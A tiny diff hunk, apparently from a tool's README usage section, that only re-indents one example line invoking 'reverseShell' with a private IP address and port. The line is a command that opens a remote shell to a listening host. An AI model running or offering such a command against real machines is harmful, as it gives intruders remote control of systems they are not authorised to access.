@@ -19,4 +19,4 @@ Using
 =====
 
 	EXAMPLES:
-	reverseShell 192.168.10.150 2035
+		reverseShell 192.168.10.150 2035
